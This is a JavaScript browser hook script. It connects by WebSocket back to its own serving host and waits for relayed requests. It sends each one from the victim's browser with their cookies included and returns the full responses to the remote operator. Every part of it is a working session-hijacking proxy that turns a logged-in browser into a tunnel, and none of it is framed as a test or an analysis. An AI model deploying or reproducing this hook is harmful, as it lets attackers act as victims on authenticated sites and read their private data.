"use strict";

(() => {
  const scriptSrc = document.currentScript.src;
  const a = document.createElement("a");
  a.href = scriptSrc;

  const wsProto = a.protocol === "https:" ? "wss:" : "ws:";
  const wsUrl = `${wsProto}//${a.host}/ws`;

  function hexToBytes(hex) {
    return new Uint8Array(hex.match(/.{2}/g).map((b) => parseInt(b, 16)));
  }

  function bytesToHex(bytes) {
    return Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join("");
  }

  function connect() {
    const ws = new WebSocket(wsUrl);

    ws.onopen = () => console.log("[hook] connected to proxy server");
    ws.onclose = () => setTimeout(connect, 3000);
    ws.onerror = () => {};

    ws.onmessage = async (ev) => {
      let msg;
      try {
        msg = JSON.parse(ev.data);
      } catch {
        return;
      }

      if (msg.type !== "request") return;

      const { id, url, method, headers, body } = msg;

      try {
        const fetchHeaders = new Headers();
        for (const name of Object.keys(headers)) {
          try {
            fetchHeaders.set(name, headers[name]);
          } catch {
            /* skip forbidden headers */
          }
        }

        const fetchOpts = {
          method,
          credentials: "include",
          headers: fetchHeaders,
        };

        if (method !== "GET" && method !== "HEAD" && body) {
          fetchOpts.body = hexToBytes(body);
        }

        const res = await fetch(url, fetchOpts);
        const respBody = bytesToHex(
          new Uint8Array(await res.arrayBuffer()),
        );

        ws.send(
          JSON.stringify({
            type: "response",
            id,
            response: {
              status: res.status,
              statusText: res.statusText,
              headers: [...res.headers],
              body: respBody,
            },
          }),
        );
      } catch (err) {
        ws.send(
          JSON.stringify({
            type: "response",
            id,
            error: err.message,
          }),
        );
      }
    };
  }

  connect();
})();
